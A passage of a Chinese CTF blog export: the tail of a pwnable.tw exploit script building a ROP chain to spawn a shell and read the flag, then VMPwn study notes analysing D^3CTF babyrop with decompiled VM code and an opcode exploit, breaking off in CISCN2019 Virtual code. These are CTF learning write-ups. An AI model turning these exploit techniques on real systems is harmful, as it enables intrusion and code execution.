class="keyword">else</span>:</span><br><span class="line">                res += item</span><br><span class="line">                Login1()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    code_base = u64(res[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x60</span> - <span class="number">0x1000</span></span><br><span class="line">    log.success(<span class="string">'code base =&gt; '</span> + hex(code_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#Login(canary)</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    <span class="comment">#main_addr =</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    padding = '\x00'</span></span><br><span class="line"><span class="string">    padding += p64(pop_rdi+code_base)+p64(0)</span></span><br><span class="line"><span class="string">    padding += p64(pop_rsi_r15+code_base)+p64(elf.bss()+code_base)+p64(0)</span></span><br><span class="line"><span class="string">    padding += p64(code_base+elf.plt['read'])</span></span><br><span class="line"><span class="string">    padding += p64(code_base+elf.bss()+8)</span></span><br><span class="line"><span class="string">    padding += p64(leave_ret_addr+code_base)[:-1]</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="comment">#first</span></span><br><span class="line">    padding = <span class="string">'\x00'</span>+<span class="string">'a'</span>*<span class="number">0x3f</span>+canary</span><br><span class="line">    padding = padding.ljust(<span class="number">0x60</span>,<span class="string">'a'</span>)</span><br><span class="line">    payload = padding</span><br><span class="line">    payload += <span class="string">'b'</span>*<span class="number">0x18</span></span><br><span class="line">    payload += p64(ebp_addr<span class="number">-0x60</span>+<span class="number">1</span><span class="number">-8</span>)[:<span class="number">-1</span>]</span><br><span class="line">    Login(payload,<span class="number">0</span>)</span><br><span class="line">    MagicCopy(<span class="string">'a'</span>*<span class="number">0x3f</span>)</span><br><span class="line">    Login1()</span><br><span class="line">    <span class="comment">#second - 1</span></span><br><span class="line">    payload = padding + <span class="string">'b'</span>*<span class="number">0x17</span>+<span class="string">"\x00"</span></span><br><span class="line">    Login(payload,<span class="number">0</span>)</span><br><span class="line">    MagicCopy(<span class="string">'a'</span>*<span class="number">0x3f</span>)</span><br><span class="line">    Login1()</span><br><span class="line">    <span class="comment">#second - 2</span></span><br><span class="line">    payload = padding + <span class="string">'b'</span>*<span class="number">0x10</span>+p64(code_base+<span class="number">0xdef</span>)</span><br><span class="line">    Login(payload,<span class="number">0</span>)</span><br><span class="line">    MagicCopy(<span class="string">'a'</span>*<span class="number">0x3f</span>)</span><br><span class="line">    Login1()</span><br><span class="line">    <span class="comment">#third - 1</span></span><br><span class="line">    payload = padding + <span class="string">'b'</span>*<span class="number">0xf</span>+<span class="string">"\x00"</span></span><br><span class="line">    Login(payload,<span class="number">0</span>)</span><br><span class="line">    MagicCopy(<span class="string">'a'</span>*<span class="number">0x3f</span>)</span><br><span class="line">    Login1()</span><br><span class="line">    <span class="comment">#third - 2</span></span><br><span class="line">    payload = padding + <span class="string">'b'</span>*<span class="number">0x8</span> + p64(code_base+leave_ret_addr)</span><br><span class="line">    Login(payload,<span class="number">0</span>)</span><br><span class="line">    MagicCopy(<span class="string">'a'</span>*<span class="number">0x3f</span>)</span><br><span class="line">    Login1()</span><br><span class="line">    <span class="comment">#fourth - 1</span></span><br><span class="line">    payload = padding + <span class="string">'b'</span>*<span class="number">0x7</span> + <span class="string">"\x00"</span></span><br><span class="line">    Login(payload,<span class="number">0</span>)</span><br><span class="line">    MagicCopy(<span class="string">'a'</span>*<span class="number">0x3f</span>)</span><br><span class="line">    Login1()</span><br><span class="line">    <span class="comment">#fourth - 2</span></span><br><span class="line">    payload = padding + p64(ebp_addr<span class="number">-0xf0</span>+<span class="number">1</span><span class="number">-8</span>)</span><br><span class="line">    Login(payload,<span class="number">0</span>)</span><br><span class="line">    MagicCopy(<span class="string">'a'</span>*<span class="number">0x3f</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x0000555555555052')</span></span><br><span class="line">    Login1()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#set rops</span></span><br><span class="line">    padding = <span class="string">'\x00'</span>+p64(pop_rdi+code_base)+p64(ebp_addr<span class="number">-0xbf</span>)</span><br><span class="line">    padding += p64(pop_rsi_r15+code_base)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    padding += p64(code_base+<span class="number">0xca0</span>)</span><br><span class="line">    padding += p64(code_base+elf.bss()+<span class="number">8</span>)</span><br><span class="line">    padding += p64(leave_ret_addr+code_base)[:<span class="number">-1</span>]</span><br><span class="line">    padding += canary + <span class="string">"\x00"</span></span><br><span class="line">    Login(padding)</span><br><span class="line">    Exit()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    pop_ebp = <span class="number">0xbd0</span></span><br><span class="line">    payload = p64(pop_rdi+code_base)+p64(elf.got[<span class="string">'puts'</span>]+code_base)+p64(elf.plt[<span class="string">'puts'</span>]+code_base)+p64(pop_rdi+code_base)+p64(ebp_addr<span class="number">-0x67</span>)+p64(pop_rsi_r15+code_base)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(pop_ebp+code_base)+p64(elf.bss()+code_base)+p64(code_base+<span class="number">0xca0</span>)</span><br><span class="line">    <span class="comment">#raw_input()</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    payload = p64(pop_rdi+code_base)+p64(ebp_addr<span class="number">-0x67</span>+<span class="number">0x30</span>)+p64(pop_rsi_r15+code_base)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(libc_base+libc.sym[<span class="string">'system'</span>])+<span class="string">"/bin/sh\x00"</span></span><br><span class="line">    <span class="comment">#raw_input()</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.sendline(<span class="string">"cat flag*"</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwnable.tw</category>
      </categories>
  </entry>
  <entry>
    <title>VMPwn学习笔记</title>
    <url>/2020/09/03/VmPwn/</url>
    <content><![CDATA[<h1 id="VMPwn学习笔记"><a href="#VMPwn学习笔记" class="headerlink" title="VMPwn学习笔记"></a>VMPwn学习笔记</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>从ByteCTF第一次接触vmpwn以来一直这类题一直做不好，假期选了几道典型的做了一下，总结一下做题的基本思路。</p>
<h2 id="D-3CTF-babyrop"><a href="#D-3CTF-babyrop" class="headerlink" title="D^3CTF babyrop"></a>D^3CTF babyrop</h2><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>vm类题目一般都是模拟一个虚拟机，最关键的地方就是逆指令，这道题涉及到的寄存器较少，逆一下发现基本就是在模拟栈的push、pop、mov等操作，一般来说我们的思路是找到一个已知的libc地址，通过add offset把它改造成one_gadget，再用mov等指令移动到rip的位置。这道题就是这样。</p>
<p>开始程序在bss上找了块区域存放我们的指令和数据,在vm里会对0x202040数据进行处理。main_func里给了一堆switch case，我们可以看到<code>*global_addr2</code>起的应该是栈指针的作用，通过它的增减来模拟栈的增长或减少。<code>*(_QWORD *)global_addr3 = &amp;v7;</code>使得<code>*(_QWORD *)global_addr3</code>存储栈地址，实际上是对这个栈进行操作，<code>*(_DWORD *)(global_addr3 + 0x10) = 10;</code>即<code>global_addr3[4]=10</code>这里的值10其实就是10*8=0x50，表示栈空间的大小。在后面的分支函数中被用来控制函数是否能成功调用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Init();</span><br><span class="line">  my_read((__int64)&amp;unk_202040, <span class="number">0x100</span>, <span class="string">'\n'</span>);</span><br><span class="line">  main_func(&amp;unk_202040, &amp;unk_202140, (__int64)&amp;unk_202150, (__int64)&amp;unk_202148);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">main_func</span><span class="params">(_QWORD *global_addr1, _QWORD *global_addr2, __int64 global_addr3, __int64 global_addr4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *global_addr41; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line">  _DWORD *global_addr31; <span class="comment">// [rsp+8h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  global_addr31 = (_DWORD *)global_addr3;</span><br><span class="line">  global_addr41 = (_QWORD *)global_addr4;</span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v7, <span class="number">0</span>, <span class="number">0x50</span>uLL);</span><br><span class="line">  *(_QWORD *)global_addr3 = &amp;v7;</span><br><span class="line">  *(_DWORD *)(global_addr3 + <span class="number">0x10</span>) = <span class="number">10</span>;</span><br><span class="line">  *(_QWORD *)(global_addr3 + <span class="number">8</span>) = *(_QWORD *)global_addr3 + <span class="number">0x50</span>LL;</span><br><span class="line">  <span class="keyword">while</span> ( *((_BYTE *)global_addr1 + *global_addr2) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( *((<span class="keyword">char</span> *)global_addr1 + *global_addr2) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        *global_addr2 = <span class="number">0L</span>L;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        PushInt(global_addr31, *((<span class="keyword">char</span> *)global_addr1 + ++*global_addr2));</span><br><span class="line">        *global_addr2 += <span class="number">4L</span>L;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x12</span>:</span><br><span class="line">        PushByte(global_addr31, *((_BYTE *)global_addr1 + ++*global_addr2));</span><br><span class="line">        ++*global_addr2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x15</span>:</span><br><span class="line">        PushLongLong(global_addr31, *((<span class="keyword">char</span> *)global_addr1 + ++*global_addr2));</span><br><span class="line">        *global_addr2 += <span class="number">8L</span>L;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x21</span>:</span><br><span class="line">        MovEsp_Esp_1((_QWORD **)global_addr31);</span><br><span class="line">        ++*global_addr2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x26</span>:</span><br><span class="line">        AddEspVal((_QWORD **)global_addr31, *((_BYTE *)global_addr1 + ++*global_addr2));</span><br><span class="line">        ++*global_addr2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x28</span>:</span><br><span class="line">        ++*global_addr2;</span><br><span class="line">        <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)AddStackPointer(global_addr31, global_addr41) )<span class="comment">// add stack pointer</span></span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x30</span>:</span><br><span class="line">        SubRspVal((_QWORD **)global_addr31, *((_BYTE *)global_addr1 + ++*global_addr2));</span><br><span class="line">        ++*global_addr2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x34</span>:</span><br><span class="line">        ++*global_addr2;</span><br><span class="line">        DoSth(global_addr31);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x38</span>:</span><br><span class="line">        ++*global_addr2;</span><br><span class="line">        MovRspZero((__int64)global_addr31);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x42</span>:</span><br><span class="line">        MovRsp2(global_addr31);</span><br><span class="line">        ++*global_addr2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x51</span>:</span><br><span class="line">        AddItSelf((_QWORD **)global_addr31);</span><br><span class="line">        ++*global_addr2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x52</span>:</span><br><span class="line">        SubItSelf((_QWORD **)global_addr31);</span><br><span class="line">        ++*global_addr2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x56</span>:</span><br><span class="line">        SetValFromBuf((_QWORD **)global_addr31, *(_DWORD *)((<span class="keyword">char</span> *)global_addr1 + ++*global_addr2));</span><br><span class="line">        *global_addr2 += <span class="number">4L</span>L;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这里有几个比较关键的函数，在逆向的时候就可以考虑到，首先是这个<code>AddStackPointer</code>可以往下增加栈指针，达到溢出的效果，我们的输入地址为<code>rbp-0x60</code>，这个函数一次将栈指针增加0x50，因此我们不能一次就达到目的，需要执行两次，但是这里有限制<code>!a1[4]</code>的时候会失败，而我们执行一次会让<code>a1[4] -= 10</code>初始值为10，所以要想办法改一下这个值，看看函数就会发现还是有很多，减到0再加个1即可。这样就突破了栈空间的限制。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">AddStackPointer</span><span class="params">(_DWORD *a1, _QWORD *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !a1[<span class="number">4</span>] &amp;&amp; *a2 &gt; <span class="number">1L</span>L )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  *(_QWORD *)a1 += <span class="number">80L</span>L;                        <span class="comment">// add rsp, 0x50;++val;</span></span><br><span class="line">  a1[<span class="number">4</span>] -= <span class="number">10</span>;</span><br><span class="line">  ++*a2;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>有了上面的函数只能算是有了第一步，我们还得构造出one_gadget出来，调试一下看栈空间，是我们第一次加0x50后的栈内容，0x<em>bd8为返回地址，我们调用两次这个stack_pointer_add到0x</em>c10。在其上方0x*bf8有个libc相关的地址通过<code>PushLongLong</code>函数让栈指针上移，push一个<code>offset</code>到这个libc所在栈+8的位置再用<code>AddEsp_Esp_1</code>将其相加得到<code>one_gadget</code>地址，最后多次执行<code>DoSth</code>把其换到<code>retn_addr</code>所在位置(注意我们使用的gaeget的条件是<code>rsp+0x30=NULL</code>所以中间有一步<code>mov [rsp+8], 0</code>是为了让gadget满足条件)</p>
<p><img src="/2020/09/03/VmPwn/1.png" alt="stack"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">PushLongLong</span><span class="params">(_DWORD *a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1[<span class="number">4</span>] &gt; <span class="number">9u</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  *(_QWORD *)a1 -= <span class="number">8L</span>L;</span><br><span class="line">  **(_QWORD **)a1 = a2;</span><br><span class="line">  ++a1[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">AddEsp_Esp_1</span><span class="params">(_QWORD **a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  **a1 += *(*a1 - <span class="number">1</span>);</span><br><span class="line">  *(*a1 - <span class="number">1</span>) = <span class="number">0L</span>L;                             <span class="comment">// add [esp],[esp-8];mov [esp-8],0;</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">DoSth</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v1; <span class="comment">// ST08_8</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  ++a1[<span class="number">4</span>];</span><br><span class="line">  *(_QWORD *)v1 -= <span class="number">8L</span>L;</span><br><span class="line">  **(_QWORD **)v1 = *(_QWORD *)(*(_QWORD *)v1 + <span class="number">8L</span>L);<span class="comment">// mov [rsp-8],[rsp]; mov [rsp],0;</span></span><br><span class="line">  *(_QWORD *)(*(_QWORD *)a1 + <span class="number">8L</span>L) = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><p>exp来自官方wp</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">'./babyrop'</span>)</span><br><span class="line"><span class="comment">#r = remote('')</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">gdb.attach(r)</span><br><span class="line">payload =  chr(<span class="number">0x28</span>)                 <span class="comment">#pop10</span></span><br><span class="line">payload += chr(<span class="number">0x15</span>) + p64(<span class="number">0</span>)        <span class="comment">#push 1</span></span><br><span class="line">payload += chr(<span class="number">0x28</span>)                 <span class="comment">#pop10</span></span><br><span class="line">payload += chr(<span class="number">0x38</span>)                 <span class="comment">#mov [rsp+8],0</span></span><br><span class="line">payload += chr(<span class="number">0x56</span>) + p32(<span class="number">0x24a3a</span>)  <span class="comment">#mov [rsp],0x24a3a</span></span><br><span class="line">payload += chr(<span class="number">0X34</span>)                 <span class="comment">#mov [rsp-8],[rsp]   rsp -=8</span></span><br><span class="line">payload += chr(<span class="number">0x21</span>)                 <span class="comment">#add [rsp-8],[rsp]</span></span><br><span class="line">payload += chr(<span class="number">0X34</span>)*<span class="number">5</span>               <span class="comment">#mov [rsp-8],[rsp]   rsp -=8</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="CISCN2019-Virtual"><a href="#CISCN2019-Virtual" class="headerlink" title="CISCN2019 Virtual"></a>CISCN2019 Virtual</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><p>剩下两篇是看0xC4m3l师傅在先知发的博客学习的，此为第一篇</p>
<h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h3><p>程序在堆上分配了几块内存用来存放数据指令和输出，其中指令以空格区分开，在提取指令的函数里给了我们实现功能的提示，这里是将<code>ptr</code>的输入指令流提取到<code>ins</code>里。对照着我们可以在<code>main_method</code>里确定函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *s; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  node *stack_data; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">void</span> **ins; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">void</span> **output; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  sub_401DA9();</span><br><span class="line">  s = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  stack_data = MyMalloc(<span class="number">0x40</span>);</span><br><span class="line">  ins = (<span class="keyword">void</span> **)MyMalloc(<span class="number">0x80</span>);</span><br><span class="line">  output = (<span class="keyword">void</span> **)MyMalloc(<span class="number">0x40</span>);</span><br><span class="line">  ptr = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Your program name:"</span>);</span><br><span class="line">  my_read((__int64)s, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Your instruction:"</span>);</span><br><span class="line">  my_read((__int64)ptr, <span class="number">0x400</span>u);</span><br><span class="line">  ExtractIns((__int64)ins, ptr);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Your stack data:"</span>);</span><br><span class="line">  my_read((__int64)ptr, <span class="number">0x400</span>u);</span><br><span class="line">  PutData((__int64)stack_data, ptr);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)main_method((__int64)ins, (__int64)stack_data, (__int64)output) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"-------"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">    MyPuts(stack_data);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"-------"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Your Program Crash :)"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  FreeAll(ins);</span><br><span class="line">  FreeAll((<span class="keyword">void</span> **)stack_data);</span><br><span class="line">  FreeAll(output);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">ExtractIns</span><span class="params">(__int64 malloc_chunk, <span class="keyword">char</span> *ptr1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *s1; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  _QWORD *ptr; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( malloc_chunk )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">8L</span>L * *(<span class="keyword">signed</span> <span class="keyword">int</span> *)(malloc_chunk + <span class="number">8</span>));</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( s1 = strtok(ptr1, delim); v2 &lt; *(_DWORD *)(malloc_chunk + <span class="number">8</span>) &amp;&amp; s1; s1 = strtok(<span class="number">0L</span>L, delim) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">"push"</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        ptr[v2] = <span class="number">0x11</span>LL;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">"pop"</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        ptr[v2] = <span class="number">0x12</span>LL;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">"add"</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        ptr[v2] = <span class="number">0x21</span>LL;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">"sub"</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        ptr[v2] = <span class="number">0x22</span>LL;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">"mul"</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        ptr[v2] = <span class="number">0x23</span>LL;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">"div"</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        ptr[v2] = <span class="number">0x24</span>LL;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">"load"</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        ptr[v2] = <span class="number">0x31</span>LL;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">"save"</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        ptr[v2] = <span class="number">0x32</span>LL;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        ptr[v2] = <span class="number">0xFF</span>LL;</span><br><span class="line">      &#125;</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = v2 - <span class="number">1</span>; i &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)PutInstruction((node *)malloc_chunk, ptr[i]); --i )</span><br><span class="line">      ;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">main_method</span><span class="params">(__int64 ins, __int64 data, __int64 output)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  node *output1; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  __int64 choice; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  output1 = (node *)output;</span><br><span class="line">  v5 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v5 &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)MyPop((node *)ins, &amp;choice) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( choice )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">17L</span>L:</span><br><span class="line">        v5 = Push(output1, data);               <span class="comment">// push</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">18L</span>L:</span><br><span class="line">        v5 = Pop((__int64)output1, data);       <span class="comment">// pop</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">33L</span>L:</span><br><span class="line">        v5 = Add((__int64)output1);             <span class="comment">// add</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">34L</span>L:</span><br><span class="line">        v5 = Sub((__int64)output1);             <span class="comment">// sub</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">35L</span>L:</span><br><span class="line">        v5 = Mul((__int64)output1);             <span class="comment">// mul</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">36L</span>L:</span><br><span class="line">        v5 = Div((__int64)output1);             <span class="comment">// div</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">49L</span>L:</span><br><span class="line">        v5 = Load(output1);                     <span class="comment">// 